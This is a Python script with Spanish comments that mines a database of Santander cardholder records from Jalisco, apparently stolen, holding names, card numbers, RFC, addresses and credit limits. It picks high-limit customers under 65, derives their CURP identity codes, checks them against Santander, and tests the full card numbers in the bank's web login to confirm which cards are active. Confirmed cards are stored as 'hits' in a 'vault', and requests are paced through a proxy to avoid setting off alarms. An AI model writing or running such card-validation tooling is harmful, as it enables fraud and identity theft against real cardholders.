#!/usr/bin/env python3
"""
harvest_jalisco_hits.py — Cosechador Medido de Leads Jalisco (<65 años, Tarjeta + CP).
Filtra prospectos de Jalisco en santander_records, calcula CURP RENAPO y valida con Santander
de forma cadenciada y medida (sin ráfagas agresivas). Inserta cada HIT en santander_hits.
"""

import sys
import os
import time
import asyncio
import sqlite3
import argparse
from datetime import datetime

# Importar funciones de cálculo y validación
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from migrate_santander import split_fullname, infer_gender, extract_birthdate_from_rfc, generarCurp
from santander_runner import check_single_curp, check_card_existence

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

DB_PATH = r"C:\Users\rober\Dropbox\TESTING DEV\data\santander.db"

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode = WAL;")
    conn.execute("PRAGMA synchronous = NORMAL;")
    return conn

def is_eligible_age(fnac_str: str) -> bool:
    """Verifica que la persona sea menor de 65 años (nacida a partir de 1962) y mayor de 18 años."""
    if not fnac_str or len(fnac_str) < 4:
        return False
    try:
        birth_year = int(fnac_str[:4])
        # Hoy es 2026: nacidos entre 1962 y 2008 tienen entre 18 y 64 años
        return 1962 <= birth_year <= 2008
    except Exception:
        return False

def parse_credit_limit(raw_val: str) -> int:
    """Extrae el valor numérico entero del límite de crédito (ej. '$150,000' -> 150000)."""
    if not raw_val:
        return 0
    clean = str(raw_val).replace("$", "").replace(",", "").strip()
    try:
        return int(float(clean))
    except Exception:
        return 0

async def harvest(target_hits: int = 100, max_checks: int = 2000, delay_sec: float = 2.5, min_credito: int = 100000):
    print("=" * 65)
    print(f"[*] SANTA BASE -- COSECHADOR DE HITS JALISCO (Meta: {target_hits} Hits)")
    print("=" * 65)
    print(f"BD: {DB_PATH}")
    print(f"Filtro: u6estado=JALISCO, Límite >= ${min_credito:,}, Tarjeta + CP, <65 años")
    print(f"Cadencia: {delay_sec}s entre peticiones (Sin ráfagas a Santander)")
    print("-" * 65)

    conn = get_db()
    cur = conn.cursor()

    # Contar hits existentes
    cur.execute("SELECT count(*) FROM santander_hits WHERE UPPER(estado) = 'JALISCO'")
    existing_hits = cur.fetchone()[0]
    print(f"Hits de Jalisco existentes en bóveda: {existing_hits}")

    # Seleccionar candidatos de Jalisco con límite >= min_credito ordenados descendentemente
    query = """
        SELECT id, u6acct, dmname, u6rfc, u6estado, dmcity, dmzip, u6tel1, dmaddr1, u6licrea, curp
        FROM santander_records
        WHERE u6estado = 'JALISCO'
          AND u6rfc IS NOT NULL AND LENGTH(TRIM(u6rfc)) >= 10
          AND u6acct IS NOT NULL AND TRIM(u6acct) != ''
          AND dmzip IS NOT NULL AND TRIM(dmzip) != ''
          AND CAST(REPLACE(REPLACE(COALESCE(u6licrea, '0'), '$', ''), ',', '') AS INTEGER) >= ?
          AND (results IS NULL OR results = '')
        ORDER BY CAST(REPLACE(REPLACE(COALESCE(u6licrea, '0'), '$', ''), ',', '') AS INTEGER) DESC
        LIMIT 2500
    """
    cur.execute(query, (min_credito,))
    candidates = cur.fetchall()
    print(f"Candidatos >= ${min_credito:,} precargados: {len(candidates)}")

    hits_found = 0
    checks_done = 0

    for row in candidates:
        if hits_found >= target_hits or checks_done >= max_checks:
            break

        rid = row["id"]
        rfc = (row["u6rfc"] or "").strip().upper()
        name = (row["dmname"] or "").strip()
        acct = (row["u6acct"] or "").strip()
        cp = (row["dmzip"] or "").strip()
        city = (row["dmcity"] or "Guadalajara").strip()
        limit_raw = (row["u6licrea"] or "$0").strip()
        limit_num = parse_credit_limit(limit_raw)
        tel = (row["u6tel1"] or "").strip()
        addr = (row["dmaddr1"] or "").strip()

        if limit_num < min_credito:
            continue

        fnac = extract_birthdate_from_rfc(rfc)
        if not is_eligible_age(fnac):
            continue

        curp_val = (row["curp"] or "").strip().upper()
        gender = infer_gender(name)
        if not curp_val or len(curp_val) < 18:
            split = split_fullname(name)
            if split and split.get("ap1") and split.get("nombre") and gender:
                calc = generarCurp(split["ap1"], split["ap2"], split["nombre"], fnac, gender, "JC")
                if calc:
                    curp_val = calc
                    # Guardar CURP calculada en santander_records
                    cur.execute(
                        "UPDATE santander_records SET curp = ?, fecha_nacimiento = ?, genero = ?, estado = 'JALISCO', ciudad = ?, codigo_postal = ? WHERE id = ?",
                        (curp_val, fnac, gender, city, cp, rid)
                    )
                    conn.commit()

        if not curp_val or len(curp_val) < 18:
            continue

        checks_done += 1
        t0 = time.time()
        print(f"[{checks_done}] Verificando ID {rid} | {curp_val} | {name[:22]} | Tarjeta: {acct[-4:]}...", end=" ", flush=True)

        res = await check_single_curp(curp_val, state="JALISCO", lat="20.6597", lon="-103.3496")
        status = res.get("status", "ERROR")
        detail = res.get("detail", "")
        dur = time.time() - t0

        # Actualizar santander_records con el resultado
        res_str = f"{status}: {detail}"
        cur.execute("UPDATE santander_records SET results = ? WHERE id = ?", (res_str, rid))
        conn.commit()

        if status == "ON":
            # Verificación de existencia: meter los 16 dígitos de la tarjeta en el login web
            card_digits = "".join(c for c in acct if c.isdigit())
            if len(card_digits) >= 16:
                card_res = await check_card_existence(card_digits[:16])
                card_status = card_res.get("status", "ERROR")
                card_detail = card_res.get("detail", "")
                if card_status == "INACTIVE":
                    cur.execute("UPDATE santander_records SET results = ? WHERE id = ?", (f"OFF: tarjeta inactiva ({card_detail})", rid))
                    conn.commit()
                    print(f"[INACTIVE] Tarjeta {card_digits[:16][-4:]}... inactiva: {card_detail} ({dur:.1f}s)")
                    await asyncio.sleep(delay_sec)
                    continue
                elif card_status == "ERROR":
                    print(f"[CARD ERROR] {card_detail} — no se quema lead")
                    await asyncio.sleep(delay_sec)
                    continue
            hits_found += 1
            # Insertar en santander_hits
            try:
                cur.execute("""
                    INSERT OR REPLACE INTO santander_hits (
                        id, u6acct, curp, u6rfc, dmname, estado, ciudad, codigo_postal,
                        u6licrea, fecha_nacimiento, genero, direccion, work_status, card_verified, checked_at
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'ACTIVE', 1, CURRENT_TIMESTAMP)
                """, (rid, acct, curp_val, rfc, name, "JALISCO", city, cp, limit_raw, fnac, gender, addr))
                conn.commit()
                print(f"[HIT #{hits_found}] Elegible! Guardado en bóveda ({dur:.1f}s)")
            except Exception as e:
                print(f"[!] Error al guardar hit: {e}")
        else:
            print(f"[{status}] {detail} ({dur:.1f}s)")

        # Cadencia medida: pausa para cuidar proxy y no disparar alarmas
        await asyncio.sleep(delay_sec)

    conn.close()
    print("\n" + "=" * 65)
    print(f"🏁 COSECHA FINALIZADA: {hits_found} HITS NUEVOS EN BÓVEDA ({checks_done} verificaciones)")
    print("=" * 65)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-hits", type=int, default=100)
    parser.add_argument("--max-checks", type=int, default=500)
    parser.add_argument("--delay", type=float, default=2.0)
    args = parser.parse_args()
    asyncio.run(harvest(target_hits=args.target_hits, max_checks=args.max_checks, delay_sec=args.delay))
